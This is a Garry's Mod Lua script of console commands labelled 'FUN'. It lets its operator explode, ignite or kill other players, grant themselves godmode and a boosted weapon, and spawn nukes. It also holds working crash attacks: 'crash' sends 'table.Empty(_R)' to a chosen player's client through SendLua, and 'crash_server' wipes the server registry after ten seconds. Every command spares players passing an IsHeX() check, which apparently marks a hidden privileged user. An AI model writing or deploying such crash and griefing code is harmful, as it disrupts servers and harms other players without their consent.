
--- === FUN === ---



--NOCLIP EXPLODE
local CanExplode = false
local function ExplodeNC()
	if CanExplode then
		for k,v in pairs( player.GetAll() ) do
			if not v:IsHeX() then
				local move = v:GetMoveType()
				if (move == MOVETYPE_NOCLIP or move == MOVETYPE_FLY) then
					v:SetMoveType(MOVETYPE_WALK)
					v:Spawn()
				end
			end
		end
	end
end
hook.Add("Think", "ExplodeNC", ExplodeNC)


local function NCExplode(ply,cmd,args)
	if CanExplode then
		CanExplode = false
		ply:print("[OFF] Noclip explode")
	else
		CanExplode = true
		ply:print("[ON] Noclip explode")
	end
end
command.Add("nc", NCExplode, "Explode noclipping players")





--NO NUKES
local Nukes = {
	["bomb_sent_atomic_bomb"] = true,
	["briefcase_sent_atomic_bomb"] = true,
	["canister_sent_atomic_bomb"] = true,
	["cannonball_sent_atomic_bomb"] = true,
	["cone_sent_atomic_bomb"] = true,
	["crate_sent_atomic_bomb"] = true,
	["hopnuke"] = true,
	["hopnuke_trap"] = true,
	["kfc_sent_atomic_bomb"] = true,
	["lego_sent_atomic_bomb"] = true,
	["mario_sent_atomic_bomb"] = true,
	["melon_sent_atomic_bomb"] = true,
	["mk-82_sent_atomic_bomb"] = true,
	["mk-82-fragile_sent_atomic_bomb"] = true,
	["sent_explosion_scaleablenuke1"] = true,
	["sent_explosion_scaleablenuke2"] = true,
	["sent_explosion_scaleablenuke3"] = true,
	["sent_explosion_scaleablenuke6"] = true,
	["sent_explosion_scaleablenuke7"] = true,
	["sent_nuke"] = true,
	["sent_nuke_awesomecube"] = true,
	["sent_nuke_detpack"] = true,
	["sent_nuke_melon"] = true,
	["sent_nuke_missile"] = true,
	["sent_nuke_radiation"] = true,
	["sent_nuke_radiation2"] = true,
	["sent_nuke_radiation3"] = true,
	["sent_nuke_radiation4"] = true,
	["sent_nuke_radiation5"] = true,
	["sent_nuke_radiation6"] = true,
	["sent_nuke_radiation7"] = true,
	["sent_nuke_radiation8"] = true,
	["sent_nuke1"] = true,
	["sent_nuke100"] = true,
	["sent_nuke100mt"] = true,
	["sent_nuke2"] = true,
	["sent_nuke200"] = true,
	["sent_nuke200mt"] = true,
	["sent_nuke3"] = true,
	["sent_nuke300"] = true,
	["sent_nuke300mt"] = true,
	["sent_nuke400"] = true,
	["sent_nuke400mt"] = true,
	["sent_nuke50"] = true,
	["sent_nuke500"] = true,
	["sent_nuke500mt"] = true,
	["sent_nuke50mt"] = true,
	["sent_nuke6"] = true,
	["sent_nuke7"] = true,
	["sent_nukegrenade"] = true,
	["sent_nukesmall"] = true,
	["soda_sent_atomic_bomb"] = true,
	["sofa_sent_atomic_bomb"] = true,
	["vendingmachine_sent_atomic_bomb"] = true,
	["waluigiracket_sent_atomic_bomb"] = true,
	
	["barrel_sent_atomic_bomb"]			= true,
	["barrel_sent_he_missile"]			= true,
	["briefcase_sent_atomic_bomb"]		= true,
	["briefcase_sent_he_missile"]		= true,
	["canister_sent_atomic_bomb"]		= true,
	["crate_sent_atomic_bomb"]			= true,
	["explosive_car"]					= true,
	["mario_sent_atomic_bomb"]			= true,
	["melon_sent_atomic_bomb"]			= true,
	["melon_sent_he_missile"]			= true,
	["MK-82_sent_atomic_bomb"]			= true,
	["MK-82_sent_he_missile"]			= true,
	["MK-82-fragile_sent_atomic_bomb"]	= true,
	["sent_explosion_scaleable"]		= true,
	["sent_nuke_radiation"]				= true,
	["sent_tnt"]						= true,
	["soda_sent_atomic_bomb"]			= true,
	["soda_sent_he_missile"]			= true,
	
	["sent_nuke_missile"] 	= true,
	["sent_nuke_detpack"] 	= true,
	["sent_nuke"] 			= true,
	
	["nuke_explosion"] 		= true,
	["sent_nuke_bomb"] 		= true,
	["nuke_missile"] 		= true,
}

local DoCheckNukes = false
local function CheckNukes()
	if DoCheckNukes then
		for k,ent in pairs( ents.GetAll() ) do
			if ValidEntity(ent) and Nukes[ ent:GetClass() ] then
				local Owner = NULL
				if CPPI then
					Owner = ent:CPPIGetOwner()
				end
				ent:Remove()
				
				if ValidEntity(Owner) and not Owner:IsHeX() then
					Owner:Kill()
				end
			end
		end
	end
end
hook.Add("Think", "CheckNukes", CheckNukes)


local function ToggleNukes(ply,cmd,args)
	if DoCheckNukes then
		DoCheckNukes = false
		ply:print("[OFF] Yes nukes")
	else
		DoCheckNukes = true
		ply:print("[ON] No nukes")
	end
end
command.Add("nukes", ToggleNukes, "Stop nukes")



local DoCheckWeapon = false
local function CheckWeapons()
	if DoCheckWeapon then
		for k,self in pairs( ents.GetAll() ) do
			if ValidEntity(self) and self:IsWeapon() and self.AdminSpawnable then
				local Owner = self.Owner
				if not ValidEntity(Owner) then
					Owner = self.owner
				end
				if not ValidEntity(Owner) then
					Owner = self:GetOwner()
				end
				
				if ValidEntity(Owner) and not Owner:IsHeX() then
					self:Remove()
				end
			end
		end
	end
end
hook.Add("Think", "CheckWeapons", CheckWeapons)


local function ToggleWeapons(ply,cmd,args)
	if DoCheckWeapon then
		DoCheckWeapon = false
		ply:print("[OFF] Yes admin-only weapons")
	else
		DoCheckWeapon = true
		ply:print("[ON] No admin-only weapons")
	end
end
command.Add("weps", ToggleWeapons, "Stop admin-only weapons")




--HEALTH
local function SetHealth(ply,cmd,args)
	local set = tonumber( args[1] ) or 87
	
	if (#args > 1) then
		ply:Spawn()
		ply:GodEnable()
	end
	ply:SetHealth(set)
	
	ply:print("Set health to: "..set)
end
command.Add("hp", SetHealth, "Set your HP, use f to force spawn")

--GOD
local function SetGod(ply,cmd,args)
	if cmd == "godon" then
		ply:GodEnable()
		ply.ShouldGod = true
		ply:print("[ON] GODMODE")
	else
		ply:GodDisable()
		ply.ShouldGod = false
		ply:print("[OFF] GODMODE")
	end
end
command.Add("godon", SetGod, "Give GODMODE")
command.Add("godoff", SetGod, "Disable GODMODE")


--BOOM
local function Boom(ply,cmd,args)
	if (#args > 0) then
		local Him = Player( args[1] ) or NULL
		
		if not ValidEntity(Him)or Him:IsHeX() then
			ply:print("[ERR] Userid: '"..args[1].."' not found")
			return
		end
		
		Him:Explode()
		ply:print("[OK] '"..Him:Nick().."' explode")
	else
		for k,v in pairs( player.GetAll() ) do
			timer.Simple(k / 3, function()
				if not v:IsHeX() then
					v:Explode()
				end
			end)
		end
		ply:print("[OK] Everyone explode")
	end
end
command.Add("boom", Boom, "Make <userid>/everyone explode")

--RESPAWN
local function Respawn(ply,cmd,args)
	ply:Spawn()
	ply:SetHealth(87)
	ply:GodEnable()
	
	ply:SetViewEntity(ply)
	ply:print("[OK] Respawned with weapons & health")
end
command.Add("respawn", Respawn, "Respawn yourself with guns+hp")



--CRASHPLAYER
local function CrashPlayer(ply,cmd,args)
	local him = Player( args[1] )
	if not ValidEntity(him) or (him == ply) or him:IsHeX() then
		return ply:print("[ERR] No Player")
	end
	
	him:SendLua([[ table.Empty(_R) ]])
	
	ply:print("[OK] Sent crash to: "..him:Nick())
end
command.Add("crash", CrashPlayer, "Crash <userid>")


--CRASHSERVER
local function CrashServer(ply,cmd,args)
	if IsUH then return ply:print("[ERR] No modules!") end
	timer.Simple(10, function()
		table.Empty(_R)
	end)
	ply:print("[OK] Server crashing in 10s")
end
command.Add("crash_server", CrashServer, "Crash the server in 10s")

--BURNALL
local function BurnAll(ply,cmd,args)
	for k,v in pairs( player.GetAll() ) do 
		if ValidEntity(v) then
			if not v:IsHeX() then
				v:Ignite(60,10)
			end
		end
	end
	ply:print("[OK] Ignite everyone")
end
command.Add("burnall", BurnAll, "Set everyone on fire")

--BURN
local function BurnHim(ply,cmd,args)
	local him = Player( args[1] )
	if not ValidEntity(him) or (him == ply) or him:IsHeX() then
		return ply:print("[ERR] No Player")
	end
	
	Player(args[1]):Ignite(60,10)
	
	ply:print("[OK] Ignite player")
end
command.Add("burn", BurnHim, "Set everyone on fire")


--BURNOFF
local function BurnOff(ply,cmd,args)
	for k,v in pairs( ents.GetAll() ) do 
		if ValidEntity(v) then
			v:Extinguish()
		end
	end
	
	for k,v in pairs(ents.FindByClass("entityflame")) do 
		v:Remove()
	end
	
	ply:print("[OK] Removed all fire")
end
command.Add("burnoff", BurnOff, "Remove all fire")

--FREEZEALL
local function FreezeAll(ply,cmd,args)
	for k,v in pairs( ents.GetAll() ) do 
		if ValidEntity(v) and not v:IsPlayer() then
			local Phys = v:GetPhysicsObject()
			
			if Phys:IsValid() then
				Phys:Sleep()
				Phys:EnableMotion(false)
			end
		end
	end
	ply:print("[OK] Frozen everything!")
end
command.Add("freezeall", FreezeAll, "Freeze everything")

--REMOVE
local function RemoveMe(ply,cmd,args)
	if IsUH then return ply:print("[ERR] No modules!") end
	if (#args > 0) then
		ply:print("[HSP] Removing all: "..args[1].."\n")
		for k,v in pairs(ents.FindByClass(tostring(args[1]))) do 
			if (v:IsValid() and not v:IsPlayer()) then
				ply:print("[HSP] Removing: "..v:EntIndex()..":"..v:GetClass())
				v:Remove()
			end
		end
	else
		local tr = ply:GetEyeTraceNoCursor()
		if (tr and tr.Hit and not tr.HitSky and tr.Entity and IsValid(tr.Entity)) then
			local ent = tr.Entity
			ply:print("[HSP] Removing: "..ent:EntIndex()..":"..ent:GetClass())
			ent:Remove()
		end
	end
end
command.Add("hsp_remove", RemoveMe, "Remove egc/trace")

--NUKE
local function Nuke(ply,cmd,args)
	local lol = ents.Create("weapon_redeemer")
		if not ValidEntity(lol) then
			ply:print("[ERR] No nuke on the server!")
			return
		end
		lol:SetPos( ply:GetEyeTrace().HitPos )
	lol:Spawn()
	ply:print("[OK] Given a nuke")
end
command.Add("nuke", Nuke, "Give a nuke")



local CLFix = [[
	local SWEP = LocalPlayer():GetActiveWeapon()
	SWEP.Primary.Delay 	= 0.05
	SWEP.Primary.Cone 	= 0
	SWEP.Primary.Spread = 0
	SWEP.Primary.Recoil = 0
	SWEP.Primary.ClipSize = 9999999
	SWEP.Primary.Clip 	= 9999999
	SWEP.Primary.Damage = 2000
]]

local function SuperGun(ply,cmd,args)
	local SWEP = ply:GetActiveWeapon()
	
	if not (ValidEntity(SWEP) and SWEP.Primary) then
		ply:print("[ERR] Only works for SWEPs")
		return
	end
	
	SWEP.Primary.Delay 		= 0.05
	SWEP.Primary.Cone 		= 0
	SWEP.Primary.Spread 	= 0
	SWEP.Primary.Recoil 	= 0
	SWEP.Primary.ClipSize 	= 99999
	SWEP.Primary.Clip 		= 99999
	SWEP.Primary.Damage 	= 2000
	
	ply:SendLua(CLFix)
	
	ply:print("[OK] Your: '"..SWEP:GetClass().."' is now SUPER")
end
command.Add("gun", SuperGun, "Make the current SWEP super")









